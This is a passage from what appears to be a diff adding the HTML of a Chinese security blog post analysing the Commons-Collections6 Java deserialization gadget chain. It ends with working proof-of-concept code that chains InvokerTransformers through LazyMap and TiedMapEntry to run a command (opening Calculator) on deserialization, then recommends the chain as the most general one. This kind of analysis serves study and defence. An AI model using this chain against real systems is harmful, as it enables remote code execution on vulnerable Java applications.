class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry= <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//执行序列化的时候，这里的put方法里面直接就会调用hash方法，以至于流程就从这走出去了。</span></span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        lazymap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="comment">//反射</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ChainedTransformer.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line">        serializable(expMap);</span><br><span class="line">        unserializable(<span class="string">&quot;ser6.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializable</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser6.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserializable</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> oos.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123110055451.png" alt="image-20240123110055451"></p>
+<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>这条链是整个CC中最为通用也是最好用的一个，这里面的gadget chain与ysoserial中的调用过程略有偏差，感兴趣可以跟一下yso中的代码，整个利用过程也更加全面。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6"><span class="toc-number">1.</span> <span class="toc-text">CC6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.1.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TiedMapEntry"><span class="toc-number">1.2.</span> <span class="toc-text">TiedMapEntry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0Gadget"><span class="toc-number">1.3.</span> <span class="toc-text">构造Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Map-remove"><span class="toc-number">1.4.</span> <span class="toc-text">Map.remove</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">1.5.</span> <span class="toc-text">结语</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&text=Commons-Collections5利用链分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=Commons-Collections5利用链分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&is_video=false&description=Commons-Collections5利用链分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Commons-Collections5利用链分析&body=Check out this article: https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=Commons-Collections5利用链分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=Commons-Collections5利用链分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=Commons-Collections5利用链分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=Commons-Collections5利用链分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&name=Commons-Collections5利用链分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&t=Commons-Collections5利用链分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    Shear1n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
